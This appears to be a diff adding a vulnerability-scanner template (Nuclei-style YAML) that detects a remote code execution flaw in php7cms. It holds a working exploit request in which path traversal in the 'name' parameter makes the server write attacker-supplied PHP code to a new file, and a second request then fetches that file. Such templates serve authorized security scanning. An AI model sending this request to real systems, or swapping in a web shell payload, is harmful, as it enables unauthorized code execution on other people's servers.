@@ -1,0 +1,31 @@
+id: php7cms-write-rce
+
+info:
+  name: php7cms系统Api/Api.php文件save_form_data方法代码执行
+  author: Str1am
+  severity: high
+  tags: php7cms,rce
+
+requests:
+  - raw:
+      - |
+        POST /index.php?s=api&c=api&m=save_form_data&name=/../../../adminss.php HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+        data=<?php phpinfo();?>
+
+      - |
+        GET /adminss.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "PHP Version"
+        part: body
+        condition: and
